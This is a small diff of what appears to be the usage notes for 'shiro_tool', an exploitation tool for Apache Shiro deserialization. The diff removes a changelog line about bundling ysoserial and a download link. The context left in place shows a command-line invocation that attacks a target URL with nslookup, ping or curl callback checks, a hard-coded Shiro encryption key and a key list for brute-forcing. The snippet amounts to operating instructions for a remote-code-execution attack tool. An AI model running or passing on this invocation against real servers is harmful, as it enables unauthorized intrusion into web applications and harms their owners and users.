@@ -2,8 +2,6 @@
 
 ```
 2020-04-24:
-集成原生ysoserial版本,更稳定,download_url:  https://xz.aliyun.com/forum/upload/affix/shiro_tool.zip
-
 
 
 java -cp shiro_tool.jar Shiro https://xx.xx.xx.xx nslookup/ping1/ping2/curl nocheck key=kPH+bIxk5D2deZiIxcaaaA== req=1.txt keys=key.txt
